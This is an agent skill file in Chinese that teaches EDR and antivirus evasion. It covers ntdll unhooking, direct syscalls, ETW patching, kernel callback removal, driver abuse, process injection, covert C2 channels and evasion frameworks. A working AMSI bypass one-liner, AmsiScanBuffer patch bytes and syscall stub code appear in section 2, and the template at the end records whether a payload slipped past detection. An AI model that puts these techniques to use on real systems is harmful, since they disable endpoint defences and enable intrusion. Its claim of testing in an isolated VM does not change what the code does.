---
name: edr-bypass-re
description: EDR/AV 绕过与逆向分析 — EDR 内部机制逆向、用户态 Hook 解除、内核回调移除、直接系统调用、进程注入、C2 隐匿通信、免杀框架构建
category: 安全研究
author: Local Workspace
license: MIT
---

# EDR / AV Bypass & Reverse Engineering

EDR (Endpoint Detection and Response) 和 AV (Antivirus) 绕过技术与逆向分析技能。覆盖: EDR 内部机制逆向、用户态 Hook 解除、内核回调移除、直接系统调用、进程注入手法、C2 隐匿通信、免杀框架构建。

> **工程纪律**: EDR Hook 链/回调表偏移量附带证据编号。免杀测试在本地隔离 VM 中运行, 不针对生产环境。绕过成功率附带测试次数。

---

## 1. EDR/AV 内部机制

### 1.1 主要检测层次

```cpp
用户态 (Ring 3):
  ▸ API Hooking (ntdll.dll): 拦截 Nt* 系统调用
  ▸ IAT Hooking: 修改导入地址表
  ▸ DLL 注入: 将自己的 DLL 注入目标进程
  ▸ ETW (Event Tracing for Windows): 安全事件监控

内核态 (Ring 0):
  ▸ SSDT Hooking: 修改系统服务描述符表
  ▸ IRP 过滤: 附加到文件系统/网络驱动栈
  ▸ 回调注册: PsSetCreateProcessNotifyRoutine / CmRegisterCallback
  ▸ 内核 ETW 提供程序
  ▸ Minifilter: 文件系统操作拦截

硬件级:
  ▸ VBS (Virtualization-Based Security): Hypervisor 隔离
  ▸ HVCI (Hypervisor-Protected Code Integrity): 内核代码完整性
  ▸ Intel CET (Control-flow Enforcement Technology): 控制流保护
```

### 1.2 主流产品特征

| 产品 | 用户态 DLL | 内核回调 | 特征 |
|------|-----------|---------|------|
| **CrowdStrike Falcon** | `umppc*.dll` 注入 | mini-filter + 进程回调 | ML 行为分析, 主要靠内核传感器 |
| **SentinelOne** | `SentinelAgent*.dll` 注入 | mini-filter + 进程回调 | Static AI + Behavioral AI 双引擎 |
| **Microsoft Defender** | `MpOav.dll`, `amsi.dll` | ELAM + mini-filter | Windows 内置, 深度集成到内核 |
| **Carbon Black** | `cb.exe` + `cbagent.dll` 注入 | mini-filter + 网络过滤 | 流式数据到云端分析 |
| **Cylance** | 无用户态 DLL 注入 | mini-filter | 主要靠静态 AI 模型 (数学方法) |
| **Sophos** | `Sophos*.dll` 注入 | mini-filter + 进程回调 | HMPA (HitmanPro.Alert) 利用防护 |

---

## 2. 绕过技术矩阵

### 2.1 用户态绕过

#### A. Unhooking (解除 DLL Hook)

```cpp
// 方法 1: 从磁盘重新加载干净的 ntdll.dll
HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", ...);
LPVOID cleanDll = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
ReadFile(hFile, cleanDll, size, &bytesRead, NULL);
// → 用干净版本的函数替代被 Hook 的版本

// 方法 2: 手动重写 Hook (Perun's Fart 技术)
// 读取原始 ntdll.dll 的 .text 段 → 覆盖被 Hook 版本的 .text 段
PVOID pNtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
// 前 5 个字节一般是被 EDR 修改的 (jmp xxx)
// 读取磁盘版本 → memcpy 回原始字节
```cpp

#### B. 直接系统调用 (Syscall)

```cpp
// 方法 1: 手动汇编 syscall (x64)
__asm {
    mov r10, rcx
    mov eax, SSN_NtAllocateVirtualMemory  // 系统服务编号
    syscall
    ret
}

// 方法 2: Hell's Gate / Halo's Gate (动态获取 SSN)
// 读取 ntdll.dll 内存中的 syscall stub → 提取 SSN
DWORD GetSyscallNumber(LPCSTR functionName) {
    // 解析 ntdll.dll → 遍历导出表 → 找到函数 → 读 syscall stub → 提取 mov eax, SSN
}

// 方法 3: SysWhispers3 (代码生成)
// 预生成所有 Nt* 的 syscall stubs, 完全避免调用 ntdll.dll
```

#### C. ETW 绕过

```cpp
// 方法 1: 修补 EtwEventWrite
// 在 EtwEventWrite 开头写 ret (C3) → 所有 ETW 事件静默

// 方法 2: 设置 ETW 提供程序级别
// EventWriteString → 设置 EnableLevel=0 → 禁用事件

// 方法 3: 挂钩 NtTraceEvent
// Hook NtTraceEvent → 过滤掉 EDR 提供程序的 GUID
```csharp

#### D. AMSI 绕过

```powershell
# PowerShell 反射加载绕过 AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 或: 内存 patch AmsiScanBuffer function → 始终返回 AMSI_RESULT_CLEAN
```

```csharp
// C# 调用 AmsiScanBuffer patch
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; // mov eax, AMSI_RESULT_CLEAN; ret
// VirtualProtect → Marshal.Copy → 覆盖 AmsiScanBuffer 开头
```markdown

### 2.2 内核态绕过

```text
▸ 清除内核回调: 遍历 PspCreateProcessNotifyRoutine 数组 → 移除 EDR 注册项
  (需要加载内核驱动, 风险高)

▸ minifilter 绕过: 注册更高 altitude 的 minifilter
  或通过 FltUnregisterFilter 移除 EDR minifilter

▸ DKOM (Direct Kernel Object Manipulation):
  操作 EPROCESS 结构 → 从 ActiveProcessLinks 链表中隐藏进程

▸ 使用有签名的易受攻击驱动 (BYOVD — Bring Your Own Vulnerable Driver):
  利用已知漏洞驱动 (如 Process Hacker kprocesshacker.sys, RTCore64.sys)
  → 获得内核 R/W 原语 → 禁用回调/隐藏进程

▸ VBS/HVCI 绕过:
  VBS 在 Hyper-V hypervisor 层运行 → 极难绕过 (需要 hypervisor escape)
```markdown

### 2.3 进程注入与规避

```text
经典注入手法:
  1. CreateRemoteThread        — 最容易检测 (被大多数 EDR 标记)
  2. APC Injection             — QueueUserAPC + 挂起线程
  3. Process Hollowing         — 创建暂停进程 → 卸载原始模块 → 写入 payload
  4. Atom Bombing              — GlobalAddAtom + NtQueueApcThread
  5. Early Bird Injection      — 创建进程 (CREATE_SUSPENDED) → APC → 恢复线程

规避手法:
  6. Module Stomping           — 用 payload 覆写合法 DLL 的 .text 段
  7. Threadless Inject         — Hook 目标进程的导出函数 → 调用即触发
  8. Fiber Injection           — 将 payload 转为 fiber → 调度到目标线程
  9. Stack Spoofing            — 伪造调用栈, 隐藏 payload 来源
  10. Call Stack Masking       — 使用间接调用/jmp 清理真实返回地址
```markdown

---

## 3. C2 隐匿通信

```text
协议选型 (从最不可疑到最可疑):
  1. HTTPS over 443 (混在 Web 流量中) — JARM/JA3 指纹仍可能识别
  2. DNS Tunneling (TXT/MX/CNAME 记录) — 低流量, 但易被 DNS 安全产品检测
  3. WebSocket over HTTPS — 与 WebSocket 应用混杂
  4. MQTT / AMQP — 与 IoT 协议混杂
  5. 自定义 TCP/UDP 协议 — 容易被基于熵的检测抓出

隐匿增强:
  ▸ Domain Fronting: 使用 CDN 前端 (如 CloudFront) → SNI 合法, Host 头指向 C2
  ▸ 流量模仿: 模拟常见应用协议 (Slack/Skype/Outlook API 格式)
  ▸ 抖动: 随机间隔发送 beacon (睡 X-Y 秒, 而非固定间隔)
  ▸ 分块传输: 将 payload 分成多块, 在不同时间/连接发送
```markdown

---

## 4. 免杀框架与工具

| 框架/工具 | 描述 |
|----------|------|
| **Sliver** | C2 框架, 自带多种 implant 生成器和绕过技术 |
| **Havoc** | 现代 C2 框架, 免杀效果好 |
| **Mythic** | 模块化 C2 框架, 多 Agent 类型 |
| **Cobalt Strike** | 商业红队框架, artifact kit + malleable C2 |
| **donut** | 将 .NET/PE/DLL 转为 shellcode |
| **ScareCrow** | EDR/AV 绕过 payload 生成器 |
| **Freeze** | Payload 暂停 (挂起模式) 绕过内存扫描 |
| **ThreadStackSpoofer** | 调用栈伪造 |
| **NimPlant** | Nim 语言 C2 implant (AV 对 Nim 特征库较少) |
| **SharpGen** | .NET 程序集生成 + Runtime 免杀 |

---

## 5. 逆向 EDR 组件

```text
5.1 定位 EDR 用户态 DLL
  ▸ 进程 Hacker / 任务管理器 → 查看目标进程加载的 DLL
  ▸ 特征: 不认识的 DLL 名称, 数字签名为 EDR 厂商

5.2 分析 Hook 链
  ▸ WinDbg: u ntdll!NtAllocateVirtualMemory L5
  ▸ 看前 5 字节: 如果是 jmp [EDR_DLL!HookHandler], 则已被 Hook
  ▸ x64 Hook 特征: mov r10, rcx; mov eax, SSN; jmp EDR_HANDLER

5.3 逆向 EDR 注入 DLL
  ▸ dump 目标进程 → 导出 EDR DLL
  ▸ IDA/Ghidra 静态分析: 找到 Hook 安装/卸载/过滤逻辑
  ▸ 动态调试: 在 HookHandler 设断点 → 跟踪过滤决策

5.4 逆向内核驱动
  ▸ 从 EDR 安装目录提取 .sys 文件
  ▸ IDA Pro + WinDbg 内核调试
  ▸ 重点查看: DriverEntry → 注册的回调 (PsSetCreateProcessNotifyRoutine, CmRegisterCallback, FltRegisterFilter, ObRegisterCallbacks)
```markdown

---

## 6. 输出规范

```text
[EDR-BYPASS: target_edr, version, date]
  测试环境: Windows 10/11 build xxxx, VM
  EDR 组件:
    ▸ 用户态 DLL: (路径+名称+版本)
    ▸ 内核驱动: (名称+Altitude)
  Hook 分析:
    ▸ NtAllocateVirtualMemory: [ ] Hooked / [ ] Clean
    ▸ NtWriteVirtualMemory: [ ] Hooked / [ ] Clean
    ▸ 回调注册: (PsSetCreateProcessNotifyRoutine: detected)
  绕过方法:
    ▸ 方法 1: (类型+效果+成功率 N/M)
    ▸ 方法 2: ...
  免杀测试:
    ▸ Payload: (类型+哈希)
    ▸ 静态检测: [ ] Detected / [V] Bypass
    ▸ 动态检测: [ ] Detected / [V] Bypass (运行 X 分钟后)
  证据索引: E1=... E2=...
```
